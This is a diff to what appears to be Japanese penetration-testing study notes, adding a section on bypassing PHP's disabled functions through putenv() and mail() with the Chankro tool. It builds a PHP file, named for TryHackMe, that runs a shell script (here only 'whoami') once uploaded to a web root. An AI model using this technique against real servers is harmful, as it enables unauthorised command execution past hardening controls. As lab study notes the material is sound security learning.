@@ -369,6 +369,25 @@ http://sample.com/~foo/bar.txt という形でアクセスすることができ�
 
 https://httpd.apache.org/docs/2.4/ja/mod/mod_userdir.html
 
+## putnev(), mail()
+
+putenv(), mail() 関数が無効化されておらず、かつPHPをアップロードできる場合
+
+```sh
+git clone https://github.com/TarlogicSecurity/Chankro.git
+cd Chankro
+python2 chankro.py --help
+
+$ cat c.sh           
+#!/bin/bash
+
+whoami > ./a.txt
+```
+
+```sh
+python2 chankro.py --arch 64 --input c.sh --output tryhackme.php --path /var/www/html
+```
+
 ## セキュリティ視点
 
 - インジェクション系の対策は、ユーザー入力を全て サニタイズ、検証、HTML エスケープ等する。
